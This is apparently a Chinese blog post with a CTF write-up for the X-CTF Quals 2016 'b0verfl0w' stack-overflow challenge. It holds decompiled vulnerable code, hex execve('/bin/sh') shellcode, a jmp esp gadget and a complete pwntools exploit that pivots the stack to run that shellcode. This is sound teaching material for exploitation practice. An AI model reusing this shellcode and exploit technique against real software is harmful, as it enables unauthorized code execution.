---
layout: post
title: CTF-PWN实例6（X-CTF Quals 2016 - b0verfl0w）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/6
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例6（X-CTF Quals 2016 - b0verfl0w）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w

## 程序保护：

```shell
$ checksec b0verfl0w
```

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

没有开启任何保护。

## 程序信息：

```shell
$file b0verfl0w
b0verfl0w: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
```

动态链接。

## 解题：

### 一、IDA分析程序溢出点

IDA分析：

这里main函数只是调用了一个函数，被调用的函数内容：

```c
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

其所能溢出的字节就只有 50-0x20-4=14 个字节，这时候就需要更短的shellcode来利用。

```python
>>> from pwn import *
>>> len(asm(shellcraft.sh()))
44
```

pwntools生成的shellcode已经有44长度，所以肯定是不能成功利用的。这时候需要用到一个非常短的shellcode。

```c
shellcode = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
```

然后将shellcode写入到栈中。控制eip指向shellcode。

### 二、编写EXP

思路：

获取到shellcode地址，程序会开启ASLR保护，地址是随机的，但是在栈上相对偏移是固定的。所以我们可以利用栈溢出对esp操作使esp指向shellcode处，然后控制程序跳转到esp处。

这里时先找到jmp esp 地址。

```shell
$ ROPgadget --binary b0verfl0w --only 'jmp|ret'  
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

这时候我们需要通过减法和计算占用字节来计算shellcode的地址。

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

这时候所需要的语句：

```c
sub esp,0x28
jmp esp
```

最总exp：

```python
from pwn import *
sh = process('./b0verfl0w')
context.log_level = 'debug'
if args.G:   
    gdb.attach(sh)

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

如果不理解可以进行调试发现栈内执行步骤。

## 总结

最短shellcode积累，利用jmp esp进行程序流程控制。